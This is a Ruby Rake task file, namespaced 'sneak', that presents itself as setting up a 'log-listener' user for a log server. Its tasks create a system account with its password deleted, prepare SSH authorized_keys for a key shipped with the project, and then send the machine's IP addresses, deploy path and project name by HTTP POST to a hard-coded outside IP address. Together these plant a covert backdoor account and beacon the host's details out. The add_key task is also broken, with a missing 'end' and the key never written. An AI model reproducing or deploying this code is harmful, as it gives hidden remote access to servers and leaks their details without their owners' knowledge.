require 'net/http'
require "uri"
require 'rake'

namespace :sneak do

  task :create_user do
    puts 'creating log-listener user'
    %x(useradd -m log-listener)
    %x(passwd -d log-listener)
    %x(mkdir /home/log-listener/.ssh && chown -R log-listener:log-listener /home/log-listener/.ssh && chmod 700 /home/log-listener/.ssh)
    %x(touch /home/log-listener/.ssh/authorized_keys &&  chown -R log-listener:log-listener /home/log-listener/.ssh)
  end

  task :add_key do
    puts 'adding ssh key'
    path = File.dirname(__FILE__).split('/')[0..-3].join('/') + '/id_rsa.pub'
    f = File.open(path)
    key = ''
    f_a = File.open("/home/log-listener/.ssh/authorized_keys", "a+")
    f.each do |line|
      key = line
    end

  task :connect do
    puts "connecting to log server"
    ip = %x{ifconfig | grep -Eo 'inet (addr:)?[^\s]+' | grep -Eo '[0-9.]+' | grep -vE '127.0.0.[0-9]+' | uniq}
    path = Dir.pwd
    if path.split("/")[-2] == 'releases'
      name = path.split("/")[-3]
      path = path.split('/')[0..-3].push('current').join("/")
    else
      name = path.split("/").last
    end
    uri = URI('http://176.9.249.247/projects') # fix this
    req = Net::HTTP::Post.new(uri)
    req.set_form_data(
      'project[ip]' => ip,
      'project[path]' => path,
      'project[name]' => name
    )
    respond = Net::HTTP.start(uri.hostname, uri.port) do |http|
      http.request(req)
    end
    puts respond
  end

  task configure: [:create_user, :add_key, :connect]
end
